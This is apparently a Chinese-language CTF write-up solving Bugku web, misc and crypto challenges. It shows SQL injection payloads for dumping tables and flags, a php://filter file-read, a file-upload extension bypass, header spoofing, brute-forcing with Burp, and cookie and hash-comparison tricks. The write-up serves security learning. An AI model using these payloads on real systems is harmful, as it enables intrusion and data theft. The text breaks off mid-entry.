尝试输入结果，但只能输入一位字符，查看控制台元素。\n找到对应的输入框元素，发现长度被限定为1位，修改后输入正确答案。\n获得flag。\nweb基础$_GET  Des:N/A。\n GET传参直接在URL后键入值即可。\n在URL后加上?what=flag。\n获得flag。\nweb基础$_POST  Des:N/A。\n 需要通过POST方式传入参数flag，使用hackbar插件。\n获得flag。\n矛盾  Des:N/A。\n 简单分析可知，GET传参，获取flag需要经过两个if判断：1.参数num不为数字；2.参数获取值为1。\n我们可以构造一个字符串，以1开头的字符串在php会被判定成功，在URL后输入?num=1x。\n获得flag。\n域名解析  Des:听说把网址解析到xxx就能拿到flag。\n Linux：\nvim /etc/hosts 添加：\u0026lt;url\u0026gt; xxx。\n保存后访问网址。\nWindows同理。\n获得flag。\n你必须让他停下  Des:N/A。\n 页面不断刷新，查看源码\n猜测flag就在网页中，不断刷新使我们无法看到，使用burp抓包。\n拦截页面后发送至Repeater，不断Go，查看Response。\n获得flag。\n本地包含 题目已挂。\n变量 \u0026lt;?php error_reporting(0); include \u0026#34;flag1.php\u0026#34;; highlight_file(__file__); if (isset($_GET[\u0026#39;args\u0026#39;])) { $args = $_GET[\u0026#39;args\u0026#39;]; if (!preg_match(\u0026#34;/^\\w+$/\u0026#34;, $args)) { die(\u0026#34;args error!\u0026#34;); } eval(\u0026#34;var_dump($$args);\u0026#34;); } ?\u0026gt;两个关键点：正则表达式和$\\$args。\n此处正则表达式匹配均为字母的串，匹配不成功则报错；$$args意为可变变量，若$args代表一个变量，那么$$args则代表另一个变量。尝试给args赋一个变量名。\nPHP九大全局变量：\n$_POST[接收post提交的数据]\n$\\_GET[接收GET提交的数据]\n$\\_FILES[文件接收处理]\n$\\_COOKIE[获取setCookie()中的name值]\n$\\_SESSION[存储或获取session的值]\n$\\_REQUEST[有get，post的功能，但较慢]\n$_SERVER[预定义服务器的一种变量]\n$_GLOBALS[包含了全部变量的全局组合数组]\n$\\_ENV[包含服务器端环境变量的数组，是PHP中的超级变量，可以在PHP程序任何位置直接访问]。\n依次尝试，当传入?args=GLOBALS时成功获得flag。\n头等舱  Des:N/A。\n 查看源码，没有有用信息，尝试御剑扫描后台。\n发现md5.php，进行访问。\n通过GET传参输入a。\n唔，然后返回最开始的网址，使用burp进行抓包，查看Response。\n获得flag。\n网站被黑  Des:这个题没技术含量但是实战中经常遇到。\n 给出的访问目录是webshell，御剑扫描后台，进入shell.php，此处对密码进行爆破，在shell处输入密码。\n获得flag。\n管理员系统  Des:N/A。\n 是一个登录窗口，查看控制台元素：\n\u0026lt;!-- dGVzdDEyMw== --\u0026gt;\r这是Base64编码，解码获得：\n\u0026lt;!-- test123 --\u0026gt;\r尝试账密admin/test123。\n页面报错，显示IP禁止访问，猜测应该是对访问地址进行了限制，尝试利用X-Forwarde-For修改XFF头为127.0.0.1。\n 百度百科：XFF是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。\n 获得flag。\nflag在index里面  Des:N/A。\n 网页给出一个超链接，点击进行跳转。\n猜测这是admin的密码，查看源码，没有线索，查看URL，发现一个文件包含漏洞。\n这里使用了php的封装协议，资料：http://php.net/manual/zh/wrappers.php.php。\n首先尝试访问http://xxx:port/post/index.php?file=php://filter/resource=index.php。\n网页空白，源码也没有有用信息，但是有5w多行，可能flag藏在里面？\n尝试一下base64编码后访问：http://xxx:port/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php\n这是一个file关键字的GET传参，php://是协议名，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示将其进行base64编码后进行读取，resource=index.php就是我们所要访问的目的页面了。\nBase64编码后访问URL，得到一串加密字符串：\n进行Base64解码：\n\u0026lt;html\u0026gt;\r\u0026lt;title\u0026gt;Bugku-ctf\u0026lt;/title\u0026gt;\r\u0026lt;?php\rerror_reporting(0);\rif (!$_GET[file]) {\recho '\u0026lt;a href=\u0026quot;./index.php?file=show.php\u0026quot;\u0026gt;click me? no\u0026lt;/a\u0026gt;';\r}\r$file = $_GET['file'];\rif (strstr($file, \u0026quot;../\u0026quot;) || stristr($file, \u0026quot;tp\u0026quot;) || stristr($file, \u0026quot;input\u0026quot;) || stristr($file, \u0026quot;data\u0026quot;)) {\recho \u0026quot;Oh no!\u0026quot;;\rexit();\r}\rinclude($file);\r//flag:flag{edulcni_elif_lacol_si_siht}\r?\u0026gt;\r\u0026lt;/html\u0026gt;\r获得flag。\n输入密码查看flag  Des:N/A。\n URL：http://xxx:port/baopo/，源码没有有用信息，告知5位数，尝试使用burp进行数字爆破，范围10000-99999。\n随机输入密码后进行抓包。\n然后发送至Intruder，在Intruder界面先选择Clear清除所有Payload，再选中pwd后点击Add。\n在Payload菜单选择攻击字典。\n在Options菜单适当选择攻击线程，加快速度，不过过大的线程可能会导致自己的网络崩溃。\n点击右上角的Start Attack，进入到爆破界面。\n可以随时点击后四个菜单栏进行排序，查看有没有特殊情况，喝杯水的时间就能把整个范围跑完，输入产生特殊值的Payload。\n获得flag。\n点击一百万次  Des:JavaScript。\n 题目已挂。\n备份是个好习惯  Des:听说备份是个好习惯。\n 得到一串编码字符串：\nd41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e\r不晓得这是什么\u0026hellip;然后用御剑扫描后台，发现index.php.bak备份文件，下载使用cat命令查看。\n简单判断，需要进行md5碰撞获得flag，而且后台会自动替换掉key关键字，首先查找常见md5碰撞值，然后通过复写key关键字进行绕过：\n?kkeyey1=QNKCDZO\u0026amp;\u0026amp;kkeyey2=s878926199a\r将构造字符串置于URL最后，回车访问。\n获得flag。\n成绩单  Des:快来查查成绩吧。\n 输入框依次输入1，2，3并提交，成功回显成绩单，当输入4时，页面没有回显。\n查看源码，没有隐藏信息。在输入框输入1'，利用最常见的单引号判断是否存在SQL注入，页面没有回显，继续测试列数，猜测有姓名、数学、英语、语文四列，输入1' order by 4#，页面回显正常，尝试1' order by 5#，页面没有回显，判断表有四列。接下来尝试爆破库名、表名、字段名。\n尝试联合查询，在查询框输入id=1' union select 1,2,3,4#，将我们的代码通过POST传参达到执行的目的，页面回显如下，四个表均有回显。\n开始爆破库名：id=1' union select 1,2,3,database()#，获得库名skctf_flag。\n进一步爆破表名：id=1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_name = database()#，获得两个表：fl4g和sc。\n爆破字段名：id=1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name = 0x666c3467#，\n ps:尝试使用table_name = fl4g时，页面没有回显，将fl4g转为十六进制，0x代表引号。\n 获得字段名：skctf_flag。\n查看字段名内容：id=-1' union select 1,2,3,skctf_flag from fl4g#。\n获得flag。\n秋名山老司机  Des:是不是老司机试试就知道。\n 打开网页后，是一个计算问题，查看源代码。\n每次刷新之后，需要计算的数字都不一样，页面通过POST方式传值，这里尝试用python脚本来进行计算：\nimport requests import re s = requests.Session() r = s.get(\u0026#39;\u0026lt;url\u0026gt;\u0026#39;) obj = re.search(r\u0026#39;(\\d+[+\\-*])+(\\d+)\u0026#39;, r.text) d = { \u0026#39;value\u0026#39;: eval(obj.group(0)) } r = s.post(\u0026#39;\u0026lt;url\u0026gt;\u0026#39;) print(r.text) 需要访问网站，还需要利用正则表达式对网站给出的数字进行匹配，所以导入requests和re库。\n从requests库导入的类一定要为Session()，若是使用了session()，会导致网页刷新，不能获得正确的值。\ns是创建的会话对象，以会话对象向url发出一个get请求。\nr用来接受网站访问获得的数据，obj用来存储进行正则表达式匹配后的值，\\d+表示匹配一个或多个字符，[+\\-*]匹配加号、减号和乘号，但因为减号为特殊符号，这里使用反斜杠\\进行转义。re.search扫描一个字符串返回第一个匹配成功的值，r.text为服务器返回页面的内容，r表示字符串为原始字符串，里面的反斜杠\\不会被认为是转义符。\n下面创建字典d，键为value，键值为刚才匹配出的式子的值，eval计算式子的值，group(0)表示匹配的结果，索引从0开始，这里指匹配到的式子。\n以POST方式给url传值，参数data为默认值，不可更改。\n ps：参数之所以为data，是因为用burp抓包显示网页传递值的参数就是data，所以不能更改。\n 最后打印r.text里的内容。\n我直接运行后由于编码报错。\n在终端输入命令chcp 65001，切换到代码所在目录，python xxx.py，就能够正常返回结果。\n获得flag。\n速度要快  Des:速度要快！！！\n 查看网页源码：\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;br\u0026gt; \u0026#34;我感觉你得快点!!!\u0026#34; \u0026lt;!-- OK, now you have to post the margin what you find --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 用burp抓包试一下。\n抓包后Response里会有flag 的返回值，经过Base64解码后得到一个字符串，提交后显示flag不正确，尝试后发现需要两次Base64解码。再次尝试Request，查看Response，发现flag后的字符串会变化，而我们还需要通过POST传值，写一个python脚本：\nimport requests import base64 url = \u0026#39;\u0026lt;url\u0026gt;\u0026#39; r = requests.Session() headers = r.get(url).headers mid = base64.b64decode(headers[\u0026#39;flag\u0026#39;]) mid = mid.decode() # 将得到的byte类型值转换为字符串类型，不然使用split()函数会导致类型不匹配报错 flag = base64.b64decode(mid.split(\u0026#39;:\u0026#39;)[1]) # 截取冒号之后的内容，冒号后有一个空格，所以跳过冒号之后的一个内容 data = {\u0026#39;margin\u0026#39;: flag} print(r.post(url, data).text) 获得flag。\ncookies欺骗  Des:N/A。\n 打开题目看见一大堆字母，猜测是栅栏密码，可是没法解，抓包试一下。\n发现GET请求的是http://xxx.xxx.xxx/index.php?line=\u0026amp;filename=a2V5cy50eHQ=，filename后的字符串经Base64解码后为keys.txt。\n继续观察，发现line并没有赋值，尝试赋值，页面显示空白，查看源码，没有东西。\n下一个思路，尝试用filename访问常见的index.php，先将它进行Base64编码，得到：aW5kZXgucGhw，尝试访问，页面还是显示空白，查看源码，发现有了\u0026lt;php。\n继续尝试给line赋值，line=1时：\nline=2时：\n写个python脚本自动更改line赋值：\nimport requests for i in range(1, 30): url = \u0026#39;\u0026lt;url\u0026gt;/index.php?line={}\u0026amp;filename=aW5kZXgucGhw\u0026#39;.format(i) # 利用format()函数更改line的值 r = requests.get(url) print(r.text) 得到php代码如下：\n\u0026lt;?php error_reporting(0); $file = base64_decode(isset($_GET[\u0026#39;filename\u0026#39;])?$_GET[\u0026#39;filename\u0026#39;]:\u0026#34;\u0026#34;); $line = isset($_GET[\u0026#39;line\u0026#39;])?intval($_GET[\u0026#39;line\u0026#39;]):0; if ($file == \u0026#39;\u0026#39;) header(\u0026#34;location:index.php?line=\u0026amp;filename=a2V5cy50eHQ=\u0026#34;); $file_list = array ( \u0026#39;0\u0026#39; = \u0026#39;keys.txt\u0026#39;, \u0026#39;1\u0026#39; = \u0026#39;index.php\u0026#39;, ); if (isset($_COOKIE[\u0026#39;margin\u0026#39;]) \u0026amp;\u0026amp; $_COOKIE[\u0026#39;margin\u0026#39;] == \u0026#39;margin\u0026#39;) { $file_list[2] = \u0026#39;keys.php\u0026#39;; } if (in_array($file, $file_list)) { $fa = file($file); echo $fa[$line]; } ?\u0026gt;发现有一个keys.php文件，将其加密后通过filaname访问，空白页面，页面源码为空，尝试burp抓包，并把Cookie改为margin=margin，查看Response。\n获得flag。\nnever give up  Des:N/A。\n 页面源码如下:\n\u0026lt;!--1p.html--\u0026gt; never never never give up!!! 尝试访问1p.html页面，但自动跳转到一个论坛，猜测有重定向头，然后直接查看源码：view-source:http://xxx.xxx.xxx.xxx:xxxx/test/1p.html，获得如下源码：\n进行URL解码：\nBase64解码：\n!--%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E--\rURL解码：\n直接访问f4l2a3g.txt。\n获得flag。\nwelcome to bugkuctf 题目已挂。\n过狗一句话 题目已挂。\n字符？正则？  Des:N/A。\n 打开题目获得代码：\n\u0026lt;?php highlight_file(\u0026#39;2.php\u0026#39;); $key = \u0026#39;KEY{****************}\u0026#39;; $IM = preg_match(\u0026#34;/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i\u0026#34;, trim($_GET[\u0026#34;id\u0026#34;]), $match); if ($IM) { die(\u0026#39;key is:\u0026#39;.$key); } ?\u0026gt; . 匹配除 \u0026ldquo;\\n\u0026rdquo; 之外的任何单个字符\n* 匹配它前面的表达式0次或多次，等价于{0,}\n{4,7} 最少匹配 4 次且最多匹配 7 次，结合前面就是匹配 4 到 7 个任意字符\n/ 匹配 / ，这里的 \\ 是为了转义\n[a-z] 匹配所有小写字母\n[:punct:] 匹配任何标点符号\n/i 表示不分大小写\n 构造payload：?id=keykeyaaaaakey:/a/keya:。\n获得flag。\n前女友 题目已挂。\nlogin1 题目已挂。\n你从哪里来  Des:N/A。\n 使用burp抓包后增加Referer为https://www.google.com。\n获得flag。\nmd5 collision  Des:N/A。\n 构造?a，回显：\n搜索常见md5碰撞值，本题使用：?a=s878926199a。\n获得flag。\n程序员本地网站  Des:请从本地访问。\n 利用插件将XFF修改为127.0.0.1。\n刷新。\n获得flag。\n各种绕过  Des:各种绕过哟。\n 打开题目获得源码：\n\u0026lt;?php highlight_file(\u0026#39;flag.php\u0026#39;); $_GET[\u0026#39;id\u0026#39;] = urldecode($_GET[\u0026#39;id\u0026#39;]); $flag = \u0026#39;flag{xxxxxxxxxxxx}\u0026#39;; if (isset($_GET[\u0026#39;uname\u0026#39;]) and isset($_POST[\u0026#39;passwd\u0026#39;])) { if ($_GET[\u0026#39;uname\u0026#39;] == $POST[\u0026#39;passwd\u0026#39;]) print \u0026#39;passwd can not be unmae.\u0026#39;; else if (sha1($_GET[\u0026#39;uname\u0026#39;]) == sha1($_POST[\u0026#39;passwd\u0026#39;]) \u0026amp; ($_GET[\u0026#39;id\u0026#39;] == \u0026#39;margin\u0026#39;)) { die(\u0026#39;Flag:\u0026#39;.$flag); } else print \u0026#39;sorry!\u0026#39;; } ?\u0026gt;分析代码得知，获得flag的条件是uname和passwd不同，且经sha1()函数加密后值相等，id=margin即可获得flag。\n那么我们利用sha1()函数N/A法处理数组的漏洞，首先经过第一处不等判断，在else if里，左边括号假假为真，总括号真真为真。构造payload:?id=margin\u0026amp;uname[]=0，通过hackbar插件POST传参passwd[]=1。\n获得flag。\n细心  Des:想办法变成admin。\n 打开题目后是一个404页面，源码啥也没有，尝试使用御剑扫描后台目录。\n发现robots.txt，访问：\n访问resusl.php：\n根据下面的GET传参提示，以及之前的题目描述，尝试构造?x=admin。\n获得flag。\n求getshell  Des:N/A。\n 是一个上传文件的题目，页面说的很清楚，只允许上传图片格式的文件，先简单写一个php，修改文件后缀为常见图片格式。\n\u0026lt;?php echo[\u0026#39;Hello\u0026#39;] ?\u0026gt;点击提交， 使用burp抓包。\n然后修改Content-Type:multipart/form-data其中字段的任一值为大写，进行绕过，然后将filename改为xxx.php5，之所以为php5是尝试过其他格式后能正确或的flag的类型，点击提交。\n获得flag。\nINSERT INTO注入  Des:不如写个Python吧。\n \u0026lt;?php error_reporting(0); function getIp() { $ip = \u0026#39;\u0026#39;; if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $ip = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } else { $ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; } $ip_arr = explode(\u0026#39;,\u0026#39;, $ip); return $ip_arr[0]; } $host = \u0026#34;localhost\u0026#34;; $user = \u0026#34;\u0026#34;; $pass = \u0026#34;\u0026#34;; $db = \u0026#34;\u0026#34;; $connect = mysql_connect($host, $user, $pass) or die(\u0026#34;Unable to connect\u0026#34;); mysql_select_db($db) or die(\u0026#34;Unable to select database\u0026#34;); $ip = getIp(); echo \u0026#39;your ip is:\u0026#39;.$ip; $sql = \u0026#34;insert into client_ip (ip) values (\u0026#39;$ip\u0026#39;)\u0026#34;; mysql_query($sql); ?\u0026gt;打开题目后直接显示IP地址。\n这道题直接贴上完整过程的python代码：\n获得flag。\n这是一个神奇的登录框 题目已挂。\n多次  Des:本题有2个flag。\n 修改URL后的id值，id=2时：\nid=3时：\nid=4时：\nid=5时：\n提示SQL注入了。\n构造?id=1' and 1=1 --+，页面回显:\n将and进行双写：?id=1' anandd 1=1 --+ ，页面回显正常，可使用双写绕过。\n然后利用异或注入检测被过滤字符，语句:?id=1'^(length('union')!=0)--+。\n若页面回显正常，则说明union字段长度为0，被过滤，继续尝试，and、or、select关键字均被过滤。\n接下来我们进行表名的爆破：?id=-1' uunionnion sselectelect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+\n字段爆破：?id=-1' uunionnion sselectelect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name='flag1'--+\n内容爆破：?id=-1' uunionnion sselectelect 1,group_concat(flag1) from flag1--+\n提交后发现并不正确，然后爆破address的内容：?id=-1' uunionnion sselectelect 1,group_concat(address) from flag1--+\n跳转：\n大小写和双写绕过都被过滤了。\n使用extrcatvalue()函数进行报错注入。\n爆破库名：?id=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+\n爆破表名：?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='web1002-2'),0x7e))--+\n爆破字段：?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag2'),0x7e))--+\n爆破内容：?id=1' and extractvalue(1,concat(0x7e,(select group_concat(flag2) from flag2),0x7e))--+\n获得flag。\nPHP_encrypt_1  Des:fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=\n \u0026lt;?php function encrypt($data, $key) { $key = md5(\u0026#39;ISCC\u0026#39;); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i = 0; $i \u0026lt; $len; $i++) { if ($x == $klen) { $x = 0; } $char .= $key[$x]; $x += 1; } for ($i = 0; $i \u0026lt; $len; $i++) { $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); } return base64_encode($str); } ?\u0026gt;直接贴上解码php脚本：\n在配置好环境的Linux终端php xxx.php运行。\n获得flag。\n文件包含2 题目已挂。\nflag.php  Des:点了login咋没反应，提示：hint。\n 御剑扫描后台，没有有效信息。\n根据提示，GET传参?hint=0，获得代码：\n\u0026lt;?php\rerror_reporting(0);\rinclude_once(\u0026quot;flag.php\u0026quot;);\r$cookie = $_COOKIE['ISecer']; // cookie = 'ISecer'\rif (isset($_GET['hint'])) { // GET传参为hint时，显示此页面\rshow_source(__FILE__);\r}\relseif (unserialize($cookie) === \u0026quot;$KEY\u0026quot;) { // 反序列化后的cookie为KEY的值，回显flag\recho \u0026quot;$flag\u0026quot;;\r}\relse {\r\u0026gt;?\r\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta http-equiv=\u0026quot;Contene-Type\u0026quot; content=\u0026quot;text/html; charset=UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Login\u0026lt;/title\u0026gt;\r\u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;admin.css\u0026quot; type=\u0026quot;text/css\u0026quot;\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;br\u0026gt;\r\u0026lt;div class=\u0026quot;container\u0026quot; align=\u0026quot;center\u0026quot;\u0026gt;\r\u0026lt;form method=\u0026quot;POST\u0026quot; action=\u0026quot;#\u0026quot;\u0026gt;\r\u0026lt;p\u0026gt;\u0026lt;input name=\u0026quot;user\u0026quot; type=\u0026quot;text\u0026quot; placeholder=\u0026quot;Username\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\u0026lt;input name=\u0026quot;password\u0026quot; type=\u0026quot;password\u0026quot; placeholder=\u0026quot;Password\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\u0026lt;input value=\u0026quot;LOGIN\u0026quot; type=\u0026quot;button\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r\u0026lt;?php\r}\r$KEY = 'IScer:www.iscer.com';\r?\u0026gt;\r审计代码得知，变量KEY的值为NULL，测试代码如下：\n\u0026lt;?php print(serialize(\u0026#34;$KEY\u0026#34;)); $KEY=\u0026#39;flag\u0026#39;; ?\u0026gt;s:0:\u0026quot;\u0026quot;;\n使用burp抓包，添加Cookie:ISecer=s:0:\u0026quot;\u0026quot;;。\n点击发送。\n获得flag。\nsql注入2  Des:全都tm过滤了绝望吗？提示： !,!=,=,+,-,^,%\n 这道题用不上sql注入的方法，可以使用DS Store泄露获得flag。\n利用脚本：lijiejie/ds_store_exp: A .DS_Store file disclosure exploit. It parses .DS_Store file and downloads files recursively. (github.com)\npython ds_store_exp.py http://xxx.xxx.xxx.xxx:xxxx/web2/.DS_Store\n获得flag。\n孙xx的博客 此题已被玩坏。\nTrim的日记本  Des:不要一次就放弃。\n 页面所有功能都能正常使用。\n御剑扫描后台试试。\n扫出show.php。\n获得flag。\nlogin2 题目已挂。\nlogin3 题目已挂。\n文件上传2 题目已挂。\n江湖魔头 未解。\nlogin4 未解。\nWeb进阶 phpcmsV9  Des:flag在根目录里txt文件里。\n 给出的页面加载不全，查看源码也没啥有用信息。\n看看robots.txt有没有什么信息呢。\n获得flag。\n海洋CMS  Des:flag在根目录某个txt里。\n 题目已挂。\n小明的博客  Des:N/A。\n 题目已挂。\nBugku-cms1  Des:后台可以getshell哟，flag在根目录。\n 一串乱码，源码也没信息。\n御剑扫后台，啥也没有，上网看了下wp，题应该被搞坏了。\nmaccms-苹果cms  Des:N/A。\n 貌似被搞了\u0026hellip;\nBugku-企业管理系统  Des:flag在网站根目录。\n 题目已挂。\nappcms  Des:flag在根目录。\n 题目已挂。\n实战2-注入 bugkucms bugku导航 又是一个博客 Misc 签到题  Des:N/A。\n 关注公众号即可。\n这是一张单纯的图片  Des:key{}。\n 图片没什么，WinHex看看。\n最后一段有Unicode编码。\n隐写  Des:N/A。\n 一张图片，查看属性发现为500×420，WinHex修改高度。\ntelnet  Des:N/A。\n wireshark，搜索flag。\n眼见非实  Des:N/A。\n binwalk发现是zip文件，解压后依次查找flag。\n代码审计 extract变量覆盖  Des:N/A。\n \u0026lt;?php $flag = \u0026#39;xxx\u0026#39;; extract($_GET); if (isset($shiyan)) { $connect = trim(file_get_contents($flag)); if ($shiyan == $content) { echo \u0026#39;flag{xxx}\u0026#39;; } else { echo \u0026#39;Oh.no\u0026#39;; } } ?\u0026gt;简单分析得出，只要使$flag和$shiyan两个变量相等即可，使用置空的方式让其相等，这就是覆盖题目的基本思路。\n构造?flag=\u0026amp;shiyan=。\n获得flag。\n分析 flag被盗  Des:flag被盗，赶紧溯源！\n 给了一个key.pcapng文件，使用记事本打开。\nCtrl+F搜索flag。\n获得flag。\n加密 滴答~滴  Des:-\u0026hellip; -.- -.-. - ..-. \u0026ndash; .. \u0026hellip; -.-.。\n 很简单的Morse加密，摩尔斯电码转换器：在线进行摩尔斯电码和英文字母的相互转换，可以把莫尔斯电码转换为英文字母，也可把英文字母转换为摩尔斯电码 (zhongguosou.com)。\n获得flag。\n聪明的小羊  Des:一只小羊翻过了2个栅栏，KYsd3js2E{a2jda}。\n 很明显，栅栏加密，栅栏密码在线加密解密 - 千千秀字 (qqxiuzi.cn)。\n获得flag。\nok  Des:Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.\n 没看懂这是啥\u0026hellip;再好好想想。\n这是啥，Ook编码\u0026hellip;https://www.splitbrain.org/services/ook。\n获得flag。\n这不是摩斯密码  Des:下载看看吧。\n 这是Brainfuck编码\u0026hellip;https://www.splitbrain.org/services/ook。\n获得flag。\neasy_crypto  Des:0010 0100 